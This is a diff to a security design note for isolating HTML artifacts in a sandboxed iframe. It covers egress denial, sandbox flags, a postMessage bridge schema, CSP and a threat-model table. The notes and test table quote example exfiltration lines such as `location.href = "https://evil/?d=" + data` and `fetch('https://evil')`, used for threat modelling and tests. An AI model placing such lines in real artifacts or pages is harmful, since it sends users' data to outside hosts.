@@ -28,14 +28,15 @@ exfiltrate conversations and phish the owner.
 - The host is a separate process/container with a read-only filesystem.
 - It sets no cookies and accepts no session or Basic credentials.
 - It has no network route to OpenCode or the workspace.
-- Egress is limited to an allowlist (or disabled).
+- Egress is disabled. A network namespace or firewall rule drops all outbound
+  traffic; an allowlist is not the default.
 
 ## Iframe
 
 ```html
 <iframe
   src="https://artifacts.example.com/a/<id>?exp=<unix>&sig=<hmac>"
-  sandbox="allow-scripts allow-modals allow-popups"
+  sandbox="allow-scripts"
   referrerpolicy="no-referrer"
   loading="lazy"
   title="Artifact preview"
@@ -45,10 +46,29 @@ exfiltrate conversations and phish the owner.
 - `allow-scripts` is required for interactive artifacts.
 - `allow-same-origin` is forbidden with `allow-scripts`.
 - `allow-forms` is omitted because the artifact CSP sets `form-action 'none'`.
+- `allow-modals` and `allow-popups` are omitted: the app owns dialogs and
+  external links.
 - `allow-top-navigation` is forbidden.
 - `allow-popups-to-escape-sandbox` is forbidden.
-- The parent listens to `postMessage` with an origin check and a narrow message
-  schema.
+- The parent listens to `postMessage` with an origin check, a source check and
+  a narrow message schema.
+
+## Iframe bridge
+
+```
+app → artifact: { type: "artifact:init", id, locale, theme }
+artifact → app: { type: "artifact:ready" }
+artifact → app: { type: "artifact:resize", height: number }
+artifact → app: { type: "artifact:result", title?, text?, data? }
+```
+
+- Accept a message only when `event.origin` equals the artifact origin **and**
+  `event.source === iframe.contentWindow`.
+- Validate the shape; drop unknown types. Limit a result to 64 KiB and
+  rate-limit per artifact.
+- Never render `text` as HTML and never execute `data`. A result becomes a
+  composer draft by default.
+- The bridge carries no token, no cookie and no direct app API.
 
 ## CSP for the artifact origin
 
@@ -59,6 +79,7 @@ Content-Security-Policy:
   style-src 'unsafe-inline';
   img-src data: blob:;
   font-src data:;
+  media-src data: blob:;
   connect-src 'none';
   frame-src 'none';
   base-uri 'none';
@@ -70,10 +91,16 @@ Notes:
 
 - `unsafe-inline`/`unsafe-eval` are acceptable only inside the isolated origin;
   they are not acceptable on the app origin.
-- Exfiltration is blocked by `connect-src 'none'` **and** by allowing no remote
-  image source. `img-src https:` would reopen a channel through
-  `new Image().src`; if an artifact needs remote images, proxy them through the
-  artifact host.
+- Subresource exfiltration is blocked by `connect-src 'none'` **and** by
+  allowing no remote image source. `img-src https:` would reopen a channel
+  through `new Image().src`; if an artifact needs remote images, proxy them
+  through the artifact host.
+- **Self-navigation is not blocked by CSP or by the sandbox.** An artifact can
+  set `location.href = "https://evil/?d=" + data`; without
+  `allow-top-navigation` it only navigates its own frame, but the request still
+  leaves the host. The controls are the egress-deny policy on the artifact
+  container and the fact that the signed URL grants nothing else. Do not claim
+  that CSP alone prevents exfiltration.
 - If an artifact needs network access, add an explicit per-artifact allowlist
   and document the threat model; never enable it globally.
 
@@ -89,12 +116,14 @@ Notes:
 
 | Threat | Mitigation | Test |
 | --- | --- | --- |
-| Cookie theft | separate origin, no cookies | `document.cookie` is empty |
+| Cookie theft | separate origin, host-only app cookie | `document.cookie` is empty |
 | API access | no same-origin, CORS deny | `fetch('/api/...')` fails |
 | Top navigation | no `allow-top-navigation` | `window.top.location` blocked |
-| Popup phishing | no escape-sandbox | popup has opaque origin |
-| Data exfiltration | `connect-src 'none'` + no remote image source | `fetch('https://evil')` and `new Image().src='https://evil'` both blocked |
+| Popup phishing | no `allow-popups` | `window.open` returns null |
+| Subresource exfiltration | `connect-src 'none'`, no remote images | `fetch('https://evil')` and `new Image().src='https://evil'` both blocked |
+| Self-navigation exfiltration | egress-deny on the artifact container | navigation to an external host fails at the network |
 | Parent DOM access | sandbox | `parent.document` throws |
+| Bridge abuse | origin + source check, schema, size limit | foreign-origin and oversized messages are dropped |
 | Malicious download | `Content-Disposition: attachment` | download requires user action |
 | Resource exhaustion | timeouts, CPU/memory limits | runaway loop is killed |
 
